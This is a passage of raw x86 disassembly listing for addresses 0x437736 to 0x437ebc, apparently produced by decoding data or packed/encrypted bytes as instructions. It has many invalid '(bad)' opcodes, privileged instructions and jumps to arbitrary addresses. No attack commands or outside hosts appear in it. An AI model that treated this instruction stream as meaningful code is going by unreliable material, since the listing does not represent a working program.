  437736:	ins    DWORD PTR es:[edi],dx
  437737:	fisttp DWORD PTR [ebp-0x16164e7f]
  43773d:	jno    0x4376e1
  43773f:	(bad)  
  437740:	inc    DWORD PTR [eax]
  437742:	add    BYTE PTR [eax],al
  437744:	add    BYTE PTR [eax],al
  437746:	mov    eax,ds:0x328b3f8e
  43774b:	pcmpeqw mm7,mm7
  43774e:	push   ss
  43774f:	inc    eax
  437750:	xchg   edx,eax
  437751:	sar    BYTE PTR [ebp-0x62],0x91
  437755:	inc    ebx
  437756:	jno    0x437700
  437758:	xchg   ecx,eax
  437759:	je     0x4377a8
  43775b:	fucompp 
  43775d:	jb     0x4377cc
  43775f:	retf   
  437760:	int3   
  437761:	add    ebp,DWORD PTR [edx]
  437763:	mov    dh,0x3e
  437765:	lea    edi,ds:0xd6503cd0
  43776b:	in     eax,0x76
  43776d:	push   ss
  43776e:	jmp    0x8db85d24
  437773:	cli    
  437774:	in     eax,0x74
  437776:	popf   
  437777:	cli    
  437778:	cmp    al,0xff
  43777a:	cmp    al,0x9e
  43777c:	add    BYTE PTR [eax+0x29],al
  43777f:	mov    bl,0x62
  437781:	and    al,0xe9
  437783:	xor    dl,dl
  437785:	sbb    BYTE PTR [edi+0x6c4624b4],bh
  43778b:	aas    
  43778c:	push   0x623f1e15
  437791:	and    al,0x39
  437793:	clc    
  437794:	mov    edi,cr7
  437797:	test   al,0xe5
  437799:	adc    eax,0x2ae815
  43779e:	push   0xfffffff5
  4377a0:	sbb    DWORD PTR [ebx],eax
  4377a2:	mov    esi,0x9006cd97
  4377a7:	(bad)  
  4377a8:	adc    al,0xff
  4377aa:	add    BYTE PTR [eax],al
  4377ac:	add    BYTE PTR [eax],al
  4377ae:	add    BYTE PTR [edx],bh
  4377b0:	sar    DWORD PTR [esi],cl
  4377b2:	call   FWORD PTR [ebp+0x0]
  4377b5:	or     eax,0x29bed02e
  4377ba:	push   ebp
  4377bb:	adc    edx,DWORD PTR [eax]
  4377bd:	fistp  QWORD PTR [ebp-0x7adc3484]
  4377c3:	lods   al,BYTE PTR ds:[esi]
  4377c4:	dec    eax
  4377c5:	mov    ebx,0x82970510
  4377ca:	push   edx
  4377cb:	loopne 0x437811
  4377cd:	add    al,0xc
  4377cf:	sbb    edi,DWORD PTR [edx]
  4377d1:	xor    eax,0x16de7f00
  4377d6:	call   0xf9cdd78f
  4377db:	adc    al,0xb
  4377dd:	add    edi,DWORD PTR ds:0xfd8ac61b
  4377e3:	(bad)
  4377e6:	inc    edx
  4377e7:	mov    BYTE PTR [eax],bl
  4377e9:	xchg   esi,eax
  4377ea:	pop    ebx
  4377eb:	dec    esp
  4377ec:	sbb    al,0x9c
  4377ee:	cmp    al,0xa3
  4377f0:	mov    al,0xd1
  4377f2:	std    
  4377f3:	aad    0xcf
  4377f5:	add    cl,BYTE PTR [eax+eiz*8]
  4377f8:	inc    esp
  4377f9:	sbb    eax,0xe14785f9
  4377fe:	aas    
  4377ff:	nop
  437800:	dec    eax
  437801:	ror    DWORD PTR [ecx+ebp*2],cl
  437804:	cmc    
  437805:	push   ss
  437806:	test   esi,eax
  437808:	iret   
  437809:	sub    DWORD PTR [ebp+0x15],edx
  43780c:	xchg   edx,eax
  43780d:	add    ecx,DWORD PTR [edi]
  43780f:	popa   
  437810:	lods   al,BYTE PTR ds:[esi]
  437811:	add    DWORD PTR [eax],ecx
  437813:	add    BYTE PTR [eax],al
  437815:	add    BYTE PTR [eax],al
  437817:	add    al,ch
  437819:	mul    ecx
  43781b:	clc    
  43781c:	neg    DWORD PTR [edi+0x51]
  43781f:	or     al,0x1b
  437821:	retf   
  437822:	xchg   edi,eax
  437823:	inc    edx
  437824:	mov    WORD PTR [ebx-0x4e36a5f0],ds
  43782a:	mov    bh,0xc
  43782c:	nop
  43782d:	xchg   DWORD PTR [eax-0x58],esp
  437830:	dec    ebp
  437831:	into   
  437832:	in     al,0x88
  437834:	push   ebx
  437835:	loop   0x437859
  437837:	xor    al,0x36
  437839:	mov    dl,0x3f
  43783b:	add    eax,0x8edd66b9
  437840:	mov    edi,0xa99f8bc9
  437845:	fdiv   QWORD PTR [eax-0x3c]
  437848:	and    esi,DWORD PTR [esi-0x54523c38]
  43784e:	pusha  
  43784f:	dec    ecx
  437850:	pushf  
  437851:	daa    
  437852:	cmp    dl,BYTE PTR [eax+0x4270b20f]
  437858:	xchg   esp,eax
  437859:	scas   eax,DWORD PTR es:[edi]
  43785a:	cmp    dl,BYTE PTR [edx+ebx*8-0x6ff74917]
  437861:	das    
  437862:	xchg   ecx,eax
  437863:	lock shr BYTE PTR ds:0x8297e031,0x8
  43786b:	(bad)  
  43786c:	ror    BYTE PTR [eax-0xa],0x9a
  437870:	les    edx,FWORD PTR [esi+0x2a3f8f0d]
  437876:	mov    cl,0xdf
  437878:	mov    ds:0x9f73ca,eax
  43787d:	add    BYTE PTR [eax],al
  43787f:	add    BYTE PTR [eax],al
  437881:	cmp    esp,ebx
  437883:	jo     0x437849
  437885:	cdq    
  437886:	ss push 0x70b29004
  43788c:	dec    eax
  43788d:	je     0x437825
  43788f:	stos   DWORD PTR es:[edi],eax
  437890:	stos   DWORD PTR es:[edi],eax
  437891:	outs   dx,DWORD PTR ds:[esi]
  437892:	(bad)  [ebx]
  437894:	fwait
  437895:	adc    eax,0x7f9279e3
  43789a:	mov    bl,0xc7
  43789c:	ret    
  43789d:	div    DWORD PTR [edi]
  43789f:	cmc    
  4378a0:	add    edx,DWORD PTR [eax+0x42ffb427]
  4378a6:	daa    
  4378a7:	push   cs
  4378a8:	test   edi,eax
  4378aa:	stos   DWORD PTR es:[edi],eax
  4378ab:	mov    gs,WORD PTR [ebp-0x15]
  4378ae:	fisub  DWORD PTR [edi]
  4378b0:	pop    esp
  4378b1:	xchg   edx,eax
  4378b2:	lock push ecx
  4378b4:	add    eax,0x6250db98
  4378b9:	xchg   DWORD PTR [esi+0x7a0f3a02],edx
  4378bf:	push   ss
  4378c0:	adc    dh,ah
  4378c2:	(bad)  
  4378c4:	add    al,BYTE PTR [ecx+ebx*2]
  4378c7:	add    DWORD PTR [edx-0x32],esp
  4378ca:	xchg   ebp,eax
  4378cb:	push   ebx
  4378cc:	loope  0x4378dc
  4378ce:	jmp    0x9eea:0xd7ff913d
  4378d5:	psllq  mm4,QWORD PTR [ecx+0xa]
  4378d9:	pop    ss
  4378da:	jbe    0x43790e
  4378dc:	icebp  
  4378dd:	push   cs
  4378de:	adc    DWORD PTR [edx],0x97dc8f74
  4378e4:	add    BYTE PTR es:[eax],al
  4378e7:	add    BYTE PTR [eax],al
  4378e9:	add    BYTE PTR [ebp+ebx*8-0x22b33d27],bl
  4378f0:	int3   
  4378f1:	cmc    
  4378f2:	imul   ebx,DWORD PTR fs:[ecx+0xf6c65ed],0x27
  4378fa:	sbb    ecx,0x0
  4378fd:	lds    eax,FWORD PTR [ecx-0x65]
  437900:	push   cs
  437901:	push   0xffffffff
  437903:	lods   eax,DWORD PTR ds:[esi]
  437904:	mov    es,ebp
  437906:	push   edi
  437907:	stos   DWORD PTR es:[edi],eax
  437908:	push   cs
  437909:	mov    ch,0x9c
  43790b:	xor    eax,0xb651ed53
  437910:	ss or  ecx,edx
  437913:	push   0xc6791f91
  437918:	xchg   edi,eax
  437919:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43791a:	jno    0x9f2b170b
  437920:	mov    ebx,tr0
  437923:	fld    DWORD PTR [eax]
  437925:	add    BYTE PTR ds:0x7a002ae1,ch
  43792b:	sbb    ebx,DWORD PTR [edx]
  43792d:	mov    ebp,DWORD PTR [esi]
  43792f:	mov    bl,0x93
  437931:	pop    edi
  437932:	icebp  
  437933:	xor    ebx,edx
  437935:	je     0x437917
  437937:	lahf   
  437938:	pop    ecx
  437939:	call   0x29442c
  43793e:	shl    BYTE PTR [ebx-0x5c7dfe62],cl
  437944:	dec    eax
  437945:	pop    edi
  437946:	sub    dh,dl
  437948:	add    edx,eax
  43794a:	leave  
  43794b:	scas   al,BYTE PTR es:[edi]
  43794c:	imul   ebp,esp,0x0
  43794f:	add    BYTE PTR [eax],al
  437951:	add    BYTE PTR [eax],al
  437953:	lds    ebp,FWORD PTR [edi+0x723c000e]
  437959:	xor    al,BYTE PTR [edx+ebx*2]
  43795c:	mov    eax,DWORD PTR [eax+0x57]
  43795f:	enter  0x769e,0xf0
  437963:	aam    0x6e
  437965:	push   cs
  437966:	call   0x28b6a5
  43796b:	add    bh,BYTE PTR [edi]
  43796d:	(bad)  
  43796e:	idiv   BYTE PTR [esi+0x5a]
  437971:	aam    0x0
  437973:	jns    0x43792b
  437975:	xchg   ecx,eax
  437976:	jl     0x4379cd
  437978:	retf   0xff69
  43797b:	stos   DWORD PTR es:[di],eax
  43797d:	cwde   
  43797e:	mov    ebp,0x6a0eb639
  437983:	aaa    
  437984:	daa    
  437985:	sar    BYTE PTR [ecx+0x4e5429],0xe1
  43798c:	or     DWORD PTR [edx],esi
  43798e:	(bad)  
  43798f:	outs   dx,BYTE PTR ds:[esi]
  437990:	pop    ecx
  437991:	into   
  437992:	lfs    edx,FWORD PTR [ebx+0xe]
  437996:	add    BYTE PTR [ecx],ch
  437998:	xor    DWORD PTR [edx],eax
  43799a:	aaa    
  43799b:	cmp    dl,BYTE PTR [edi]
  43799d:	xchg   edi,eax
  43799e:	dec    esi
  43799f:	test   DWORD PTR [esi],0xca908a03
  4379a5:	ret    0x841f
  4379a8:	ffree  st(2)
  4379aa:	push   es
  4379ab:	je     0x437974
  4379ad:	ret    0x6e0a
  4379b0:	in     eax,0x15
  4379b2:	mov    edx,0x861ed0
  4379b7:	add    BYTE PTR [eax],al
  4379b9:	add    BYTE PTR [eax],al
  4379bb:	add    BYTE PTR [eax+0x51031bcb],dl
  4379c1:	xchg   esp,eax
  4379c2:	fsubr  QWORD PTR [esi-0x4d]
  4379c5:	inc    esi
  4379c6:	sub    esp,DWORD PTR [esp+ebx*4]
  4379c9:	fwait
  4379ca:	stc    
  4379cb:	into   
  4379cc:	bound  ebx,QWORD PTR [edx-0x5893b36d]
  4379d2:	int    0x44
  4379d4:	je     0x437985
  4379d6:	adc    DWORD PTR [eax],eax
  4379d8:	nop
  4379d9:	retf   
  4379da:	mov    dh,0x99
  4379dc:	jle    0x4379e6
  4379de:	xchg   BYTE PTR [ebp+0x747d46a0],al
  4379e4:	in     al,dx
  4379e5:	(bad)
  4379e8:	xchg   esi,edx
  4379ea:	bound  ecx,QWORD PTR ds:0xf899cbd0
  4379f0:	or     eax,0x1b421b30
  4379f5:	xchg   esi,ebp
  4379f7:	adc    edi,DWORD PTR [ebx+0x5f6a9410]
  4379fd:	hlt    
  4379fe:	int3   
  4379ff:	std    
  437a00:	push   0x857acf46
  437a05:	dec    esi
  437a06:	mov    ah,0x7a
  437a08:	sbb    DWORD PTR [edi+ebx*1],0xb8426685
  437a0f:	sti    
  437a10:	nop
  437a11:	retf   
  437a12:	mov    dh,0xbb
  437a14:	loop   0x4379ab
  437a16:	xchg   BYTE PTR [ebp-0x1055904],al
  437a1c:	pop    ds
  437a1d:	retf   
  437a1e:	and    DWORD PTR [edi+0x0],eax
  437a24:	add    BYTE PTR [edx+0x6186aab2],dl
  437a2a:	mov    bl,0x6e
  437a2c:	stos   BYTE PTR es:[edi],al
  437a2d:	or     esi,DWORD PTR [edx+0x2433abf5]
  437a33:	sbb    bl,BYTE PTR [eax-0x1826d9f3]
  437a39:	out    dx,al
  437a3a:	fdiv   st,st(4)
  437a3c:	push   esp
  437a3d:	out    0x29,eax
  437a3f:	test   BYTE PTR [edx+ecx*8-0x26b5a837],0xd8
  437a47:	pop    esi
  437a48:	ret    
  437a49:	mov    ch,0xb3
  437a4b:	pop    es
  437a4c:	les    ebp,FWORD PTR [ecx+0x78]
  437a4f:	and    bh,BYTE PTR [ebx]
  437a51:	aas    
  437a52:	out    dx,al
  437a53:	loopne 0x437a59
  437a55:	nop
  437a56:	mov    dl,0xb7
  437a58:	or     al,0x90
  437a5a:	or     DWORD PTR [eax],0x31
  437a5d:	inc    edx
  437a5e:	or     DWORD PTR [ebp-0x18],0x29f5b293
  437a65:	mov    BYTE PTR [edx+0x25],bh
  437a68:	xchg   edi,eax
  437a69:	ret    
  437a6a:	mov    bh,BYTE PTR [eax+0x40]
  437a6d:	nop
  437a6e:	sub    ecx,DWORD PTR [edi-0x6713373]
  437a74:	sar    BYTE PTR [eax-0x28],cl
  437a77:	leave  
  437a78:	sbb    ebx,DWORD PTR [esi-0x3b750a8e]
  437a7e:	mov    ds,ecx
  437a80:	mov    ah,BYTE PTR [eax+0x2e]
  437a83:	arpl   WORD PTR [edi],ax
  437a85:	or     al,0xf1
  437a87:	hlt    
  437a88:	add    eax,DWORD PTR [eax]
  437a8a:	add    BYTE PTR [eax],al
  437a8c:	add    BYTE PTR [eax],al
  437a8e:	nop
  437a8f:	jg     0x437a34
  437a91:	cs scas al,BYTE PTR es:[edi]
  437a93:	mov    cl,0xac
  437a95:	xor    bh,BYTE PTR [ecx]
  437a97:	pop    edi
  437a98:	adc    esp,ebp
  437a9a:	push   eax
  437a9b:	mov    cl,0xfd
  437a9d:	add    edx,DWORD PTR [eax-0x200ed34e]
  437aa3:	ret    0xa90e
  437aa6:	xchg   ebx,eax
  437aa7:	xor    ecx,esi
  437aa9:	ficom  WORD PTR [edi-0x6c16f1ee]
  437aaf:	add    DWORD PTR [esi+esi*4-0x47],0x26ba43d7
  437ab7:	pop    edi
  437ab8:	xor    al,cl
  437aba:	push   ds
  437abb:	les    esp,FWORD PTR [esi-0x6e4dac27]
  437ac1:	sub    DWORD PTR [edi-0x6c166cd2],ecx
  437ac7:	mov    dl,0x3f
  437ac9:	out    dx,al
  437aca:	loopne 0x437ab3
  437acc:	std    
  437acd:	sub    BYTE PTR [ecx+ebx*8-0x5e50e9d],dl
  437ad4:	jmp    0x74e9:0x4ec50bfc
  437adb:	test   eax,0x2d9637a3
  437ae0:	mov    esi,0x442fe9b6
  437ae5:	loope  0x437b33
  437ae7:	pop    esi
  437ae8:	sbb    al,0x6a
  437aea:	in     al,0xd5
  437aec:	pop    esi
  437aed:	lock adc cl,bh
  437af0:	add    DWORD PTR [eax+eax*1],edx
  437af3:	add    BYTE PTR [eax],al
  437af5:	add    BYTE PTR [eax],al
  437af7:	jge    0x437b46
  437af9:	or     BYTE PTR cs:[ebx-0x563693d1],0xaa
  437b01:	xchg   ebp,eax
  437b02:	pop    es
  437b03:	jo     0x437b84
  437b05:	je     0x437b77
  437b07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437b08:	lods   al,BYTE PTR ds:[esi]
  437b09:	sbb    edi,DWORD PTR [esi]
  437b0b:	popf   
  437b0c:	lods   al,BYTE PTR ds:[esi]
  437b0d:	sbb    edi,DWORD PTR [esi]
  437b0f:	xchg   ebp,eax
  437b10:	scas   al,BYTE PTR es:[edi]
  437b11:	sbb    edx,DWORD PTR [esi+0x4b8f3f51]
  437b17:	inc    esi
  437b18:	(bad)  
  437b19:	int3   
  437b1a:	sub    BYTE PTR [ebx],bl
  437b1c:	aad    0x5a
  437b1e:	dec    esi
  437b1f:	inc    eax
  437b20:	das    
  437b21:	add    al,0x0
  437b23:	stc    
  437b24:	mov    dl,0x43
  437b26:	mov    edi,ebp
  437b28:	(bad)  
  437b29:	xchg   ebx,eax
  437b2a:	jle    0x437b65
  437b2c:	xor    dh,bh
  437b2e:	je     0x437b5a
  437b30:	es pop edi
  437b32:	add    BYTE PTR [esi-0x59dfcd59],dh
  437b38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437b39:	xor    ah,BYTE PTR [eax]
  437b3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437b3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437b3d:	xor    ah,BYTE PTR [eax]
  437b3f:	ds test ebp,esp
  437b42:	je     0x437b21
  437b44:	mul    ch
  437b46:	adc    eax,0x2ae3a5
  437b4b:	jb     0x437b88
  437b4d:	(bad)  
  437b4e:	call   FWORD PTR [ebp-0x29]
  437b51:	(bad)  
  437b52:	in     eax,dx
  437b53:	ins    BYTE PTR es:[edi],dx
  437b54:	in     al,0x91
  437b56:	into   
  437b57:	loope  0x437bb4
  437b59:	push   esi
  437b5a:	inc    DWORD PTR [eax]
  437b5c:	add    BYTE PTR [eax],al
  437b5e:	add    BYTE PTR [eax],al
  437b60:	out    0x56,al
  437b62:	shl    DWORD PTR [esi+ebp*4-0x5f],0xe5
  437b67:	adc    eax,0x2ade09
  437b6c:	and    dl,BYTE PTR ds:0x99845e45
  437b72:	inc    ebx
  437b73:	ret    0xb2b9
  437b76:	inc    eax
  437b77:	mov    ebp,DWORD PTR [eax]
  437b79:	cs push eax
  437b7b:	adc    cl,cl
  437b7d:	pop    ss
  437b7e:	adc    BYTE PTR [eax],cl
  437b80:	iret   
  437b81:	outs   dx,BYTE PTR ds:[esi]
  437b82:	push   cs
  437b83:	(bad)  
  437b84:	jl     0x437bfc
  437b86:	sbb    al,0x40
  437b88:	jns    0x437bb5
  437b8a:	fsubr  st,st(0)
  437b8c:	sub    BYTE PTR [edx-0x19],bl
  437b8f:	push   edx
  437b91:	in     al,dx
  437b92:	int3   
  437b93:	push   es
  437b94:	int    0x2d
  437b96:	dec    esi
  437b97:	add    cl,ah
  437b99:	rol    BYTE PTR [edx+0x582be6fd],cl
  437b9f:	add    al,0x90
  437ba1:	test   ah,ch
  437ba3:	sbb    ebp,esi
  437ba5:	or     ecx,DWORD PTR [edi]
  437ba7:	pop    edx
  437ba8:	cmp    DWORD PTR ds:0x6127f957,ebx
  437bae:	push   esi
  437baf:	and    al,0x94
  437bb1:	inc    esi
  437bb2:	xlat   BYTE PTR ds:[ebx]
  437bb3:	je     0x437b42
  437bb5:	jae    0x437b66
  437bb7:	ret    
  437bb8:	push   cs
  437bb9:	(bad)  
  437bba:	rol    BYTE PTR [eax+edx*4],1
  437bbd:	sbb    BYTE PTR [ecx],bh
  437bbf:	test   DWORD PTR [ecx+0xbfbdd3],eax
  437bc5:	add    BYTE PTR [eax],al
  437bc7:	add    BYTE PTR [eax],al
  437bc9:	pop    edi
  437bca:	dec    esi
  437bcb:	pushf  
  437bcc:	je     0x437b81
  437bce:	pusha  
  437bcf:	pop    ds
  437bd0:	add    al,0x1b
  437bd2:	pop    eax
  437bd3:	retf   
  437bd4:	adc    ecx,DWORD PTR [edx]
  437bd6:	inc    eax
  437bd7:	retf   
  437bd8:	ud2    
  437bda:	shr    BYTE PTR [ebx-0x39],cl
  437bdd:	inc    esp
  437bde:	loope  0x437ba6
  437be0:	push   esi
  437be1:	cwde   
  437be2:	jle    0x437bcf
  437be4:	ss cmp edi,ecx
  437be7:	sbb    dl,BYTE PTR [eax]
  437be9:	push   eax
  437bea:	dec    eax
  437beb:	int    0x4
  437bed:	imul   eax,DWORD PTR ds:0xb63e7fd,0x22
  437bf4:	pop    edx
  437bf5:	cmp    ecx,DWORD PTR [ecx]
  437bf7:	adc    eax,DWORD PTR [eax]
  437bf9:	or     eax,eax
  437bfb:	out    dx,al
  437bfc:	pop    ss
  437bfd:	adc    eax,0x18fe1b19
  437c02:	leave  
  437c03:	xchg   ebp,eax
  437c04:	mov    edi,0x853c2f6b
  437c09:	fs call 0xf91f:0x2fd58b39
  437c11:	ffree  st(7)
  437c13:	xchg   ebp,eax
  437c14:	neg    DWORD PTR [edi-0x2a]
  437c17:	push   ss
  437c18:	call   0xf9c5c04a
  437c1d:	adc    eax,0x8c0f35b2
  437c22:	mov    eax,ds:0x7cd6a835
  437c27:	int    0x43
  437c29:	ss aad 0xf4
  437c2c:	rol    BYTE PTR [eax],1
  437c2e:	add    BYTE PTR [eax],al
  437c30:	add    BYTE PTR [eax],al
  437c32:	and    DWORD PTR [esp+edx*2-0x32],edi
  437c36:	outs   dx,DWORD PTR ds:[esi]
  437c37:	xor    DWORD PTR [ecx-0x6240e6fd],esi
  437c3d:	icebp  
  437c3e:	push   edi
  437c3f:	mov    dl,0x72
  437c41:	ret    
  437c42:	test   al,al
  437c44:	xor    al,0xe
  437c46:	mov    al,ds:0x83941d29
  437c4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437c4c:	add    al,0xe
  437c4e:	mov    dl,cl
  437c50:	loop   0x437c90
  437c52:	jmp    0x13d6dc2b
  437c57:	fsub   QWORD PTR [eax-0x11]
  437c5a:	adc    al,0xad
  437c5c:	mov    ecx,DWORD PTR [eax-0xc7b2b37]
  437c62:	dec    esp
  437c63:	(bad)  
  437c65:	sbb    DWORD PTR [ebp+0x789cbb29],ecx
  437c6b:	out    dx,eax
  437c6c:	ret    0x6593
  437c6f:	repnz iret 
  437c71:	push   es
  437c72:	adc    eax,0xcf3332ec
  437c77:	out    dx,eax
  437c78:	les    eax,FWORD PTR [ebx]
  437c7a:	inc    ebx
  437c7b:	sub    ecx,edx
  437c7d:	xchg   DWORD PTR [ecx+eax*8-0x229b28f8],esp
  437c84:	stc    
  437c85:	mov    ebx,0x4f56f06
  437c8a:	loop   0x437ce9
  437c8c:	mov    edi,0x3130f851
  437c91:	add    al,0xc2
  437c93:	ror    ecx,cl
  437c95:	xchg   ebx,eax
  437c96:	add    BYTE PTR [eax],al
  437c98:	add    BYTE PTR [eax],al
  437c9a:	add    BYTE PTR [esi+0x4863f572],dl
  437ca0:	xor    DWORD PTR [esi],ecx
  437ca2:	sub    eax,0xf40d0a8c
  437ca7:	inc    ecx
  437ca8:	test   al,0xd
  437caa:	das    
  437cab:	cdq    
  437cac:	push   ecx
  437cad:	pop    edi
  437cae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437caf:	xchg   ebx,eax
  437cb0:	(bad)  
  437cb2:	in     al,dx
  437cb3:	pop    ebx
  437cb4:	xor    BYTE PTR [edx-0x17],dl
  437cb7:	jnp    0x437cc9
  437cb9:	dec    esi
  437cba:	jmp    0x6c1e3463
  437cbf:	enter  0xb0b2,0x21
  437cc3:	push   cs
  437cc4:	outs   dx,DWORD PTR ds:[esi]
  437cc5:	push   cs
  437cc6:	xchg   edi,eax
  437cc7:	and    al,al
  437cc9:	idiv   bl
  437ccb:	push   ebx
  437ccc:	mov    dl,0x98
  437cce:	sub    bh,BYTE PTR [ebp+0x77]
  437cd1:	fisub  WORD PTR [eax-0x3f]
  437cd4:	ficom  WORD PTR [esp+ebp*4+0x6512b1b]
  437cdb:	lahf   
  437cdc:	gs aas 
  437cde:	out    dx,al
  437cdf:	cmp    edx,ebp
  437ce1:	lods   al,BYTE PTR ds:[esi]
  437ce2:	ror    DWORD PTR [edi],0x6f
  437ce5:	push   cs
  437ce6:	call   0x2bdf:0xe619c716
  437ced:	cdq    
  437cee:	sub    al,0x24
  437cf0:	data16 mul BYTE PTR [ecx-0x4e]
  437cf4:	shr    edx,cl
  437cf6:	rcr    DWORD PTR gs:[edi+0x1c],cl
  437cfa:	jae    0x437d54
  437cfc:	fldpi  
  437cfe:	test   eax,0x0
  437d03:	add    BYTE PTR [ebx],bl
  437d05:	outs   dx,DWORD PTR ds:[esi]
  437d06:	jmp    0x437cfd
  437d08:	lea    eax,[ecx+eax*8-0x3e]
  437d0c:	xchg   ebp,eax
  437d0d:	add    eax,0xe2d0740d
  437d12:	cmc    
  437d13:	push   ebp
  437d14:	pop    esi
  437d15:	shr    edx,cl
  437d17:	arpl   WORD PTR [esi+0x78],cx
  437d1a:	inc    edi
  437d1b:	mov    al,ds:0x977f56
  437d20:	std    
  437d21:	sub    edi,edx
  437d23:	adc    al,0x1a
  437d25:	sbb    eax,0x2d3105e0
  437d2a:	push   edx
  437d2b:	add    BYTE PTR [eax],bh
  437d2d:	pushf  
  437d2e:	inc    eax
  437d2f:	push   edi
  437d30:	ret    0x5f3e
  437d33:	cmp    eax,0x446ca71e
  437d38:	sub    DWORD PTR [eax-0x2236ea1b],ebx
  437d3e:	sub    al,BYTE PTR [eax]
  437d40:	sbb    DWORD PTR [edi],edx
  437d42:	ins    BYTE PTR es:[edi],dx
  437d43:	inc    esp
  437d44:	sub    DWORD PTR [edi-0x15],esi
  437d47:	je     0x437d87
  437d49:	sub    al,0x2f
  437d4b:	int3   
  437d4c:	jnp    0x437db9
  437d4e:	push   cs
  437d4f:	add    ch,bh
  437d51:	lods   eax,DWORD PTR ds:[esi]
  437d52:	rol    BYTE PTR ds:0x52bc16,1
  437d58:	sahf   
  437d59:	call   0x6bb8a56c
  437d5e:	push   cs
  437d5f:	pop    eax
  437d60:	push   edi
  437d61:	outs   dx,DWORD PTR ds:[esi]
  437d62:	push   cs
  437d63:	mov    ds:0x522da1,al
  437d68:	add    BYTE PTR [eax],al
  437d6a:	add    BYTE PTR [eax],al
  437d6c:	add    dh,dh
  437d6e:	aas    
  437d6f:	jmp    edi
  437d71:	jmp    0x437de1
  437d73:	push   cs
  437d74:	xor    ecx,DWORD PTR [ebx]
  437d76:	mov    ah,0xfe
  437d78:	mov    BYTE PTR [edx+edx*1+0x56d95593],al
  437d7f:	aas    
  437d80:	hlt    
  437d81:	xor    eax,DWORD PTR [eax*2-0x14bd8b39]
  437d88:	jmp    FWORD PTR [ecx+0x25288bae]
  437d8e:	push   0xe
  437d90:	push   edx
  437d91:	stos   DWORD PTR es:[edi],eax
  437d92:	mov    BYTE PTR [edi+ecx*1-0x19],bl
  437d96:	punpckhwd mm5,mm4
  437d99:	ins    DWORD PTR es:[edi],dx
  437d9a:	and    esp,DWORD PTR [edx]
  437d9c:	mov    BYTE PTR [eax-0x3d13d4aa],dl
  437da2:	xor    esi,DWORD PTR [ecx-0x6d246fd6]
  437da8:	shl    ah,0xee
  437dab:	or     BYTE PTR [eax],al
  437dad:	add    eax,0xe6509a9f
  437db2:	mov    bl,0xe7
  437db4:	inc    DWORD PTR [edi+0x1c]
  437db7:	jle    0x437e2c
  437db9:	inc    esp
  437dba:	inc    ebx
  437dbb:	sbb    edi,eax
  437dbd:	aaa    
  437dbe:	iret   
  437dbf:	into   
  437dc0:	adc    edx,eax
  437dc2:	fist   DWORD PTR [ecx-0x4f06e08]
  437dc8:	stc    
  437dc9:	push   ebx
  437dca:	pop    esp
  437dcb:	cdq    
  437dcc:	(bad)  
  437dcd:	mov    ds:0xcdc1df,al
  437dd2:	add    BYTE PTR [eax],al
  437dd4:	add    BYTE PTR [eax],al
  437dd6:	sti    
  437dd7:	inc    edx
  437dd8:	and    eax,0x7e119066
  437ddd:	adc    esi,DWORD PTR [eax-0x37]
  437de0:	dec    esi
  437de1:	add    BYTE PTR [ebx],dl
  437de3:	mov    al,ds:0xbf55c20e
  437de8:	adc    cl,BYTE PTR [ebx-0x1d7558ab]
  437dee:	stos   BYTE PTR es:[edi],al
  437def:	fisttp DWORD PTR [esi]
  437df1:	xchg   BYTE PTR [ebp-0x39],cl
  437df4:	sbb    eax,0xd1926b5a
  437df9:	push   ebx
  437dfa:	sbb    ebp,eax
  437dfc:	pop    ds
  437dfd:	dec    ebp
  437dfe:	inc    sp
  437e00:	sub    BYTE PTR ds:0x820a2db,0x25
  437e07:	(bad)  
  437e08:	and    DWORD PTR [esi-0x6f],esp
  437e0b:	in     al,0xf4
  437e0d:	test   BYTE PTR [esi],dl
  437e0f:	cmp    BYTE PTR [edi],cl
  437e11:	add    BYTE PTR [eax-0x2fafb2ac],dl
  437e17:	stos   DWORD PTR es:[edi],eax
  437e18:	mov    bh,BYTE PTR [esi-0x34]
  437e1b:	mov    dl,0xb4
  437e1d:	nop
  437e1e:	adc    esi,edx
  437e20:	add    bl,bh
  437e22:	push   ecx
  437e23:	ja     0x437da6
  437e25:	add    ah,BYTE PTR [edi+0x65192d6a]
  437e2b:	cmp    DWORD PTR [edx],esi
  437e2d:	nop
  437e2e:	int    0xd1
  437e30:	loope  0x437dc1
  437e32:	or     eax,0x9c208d00
  437e37:	mov    dl,0xf5
  437e39:	xor    DWORD PTR [eax],eax
  437e3b:	add    BYTE PTR [eax],al
  437e3d:	add    BYTE PTR [eax],al
  437e3f:	add    BYTE PTR [ebx-0x7024530],dh
  437e45:	jne    0x437ec6
  437e47:	nop
  437e48:	mov    dl,0xf5
  437e4a:	add    eax,0x9bf5b290
  437e4f:	and    ecx,DWORD PTR [esp+edx*2]
  437e52:	nop
  437e53:	loopne 0x437e07
  437e55:	cmp    BYTE PTR [edi+ebx*8-0x6ffc0ac7],al
  437e5c:	mov    dl,0xa1
  437e5e:	jmp    0x437e68
  437e60:	inc    esi
  437e61:	fsincos 
  437e63:	jl     0x437e58
  437e65:	test   BYTE PTR [eax-0x64126984],dl
  437e6b:	dec    ebp
  437e6c:	mov    ds:0xf213901c,al
  437e71:	imul   eax,DWORD PTR [edi],0x4fff2ae
  437e77:	and    BYTE PTR [ebx-0x83004c9],dh
  437e7d:	jne    0x437efe
  437e7f:	nop
  437e80:	mov    dl,0xf5
  437e82:	pop    es
  437e83:	nop
  437e84:	mov    dl,0xf5
  437e86:	fwait
  437e87:	sti    
  437e88:	or     eax,esp
  437e8a:	(bad)  
  437e8b:	loopne 0x437e3f
  437e8d:	mov    eax,0x5de0d39
  437e92:	ss inc ecx
  437e94:	aas    
  437e95:	xor    dl,BYTE PTR [eax-0x47f1c2c0]
  437e9b:	sub    al,0x30
  437e9d:	pop    ss
  437e9e:	jmp    0x2811b236
  437ea3:	add    BYTE PTR [eax],al
  437ea5:	add    BYTE PTR [eax],al
  437ea7:	add    BYTE PTR [edi+esi*1+0x69],bl
  437eab:	icebp  
  437eac:	cli    
  437ead:	mov    eax,ds:0xce89963e
  437eb2:	xchg   esi,eax
  437eb3:	sahf   
  437eb4:	pop    ss
  437eb5:	rcl    DWORD PTR [ecx+0x3ea98ea9],0x72
  437ebc:	push   ss
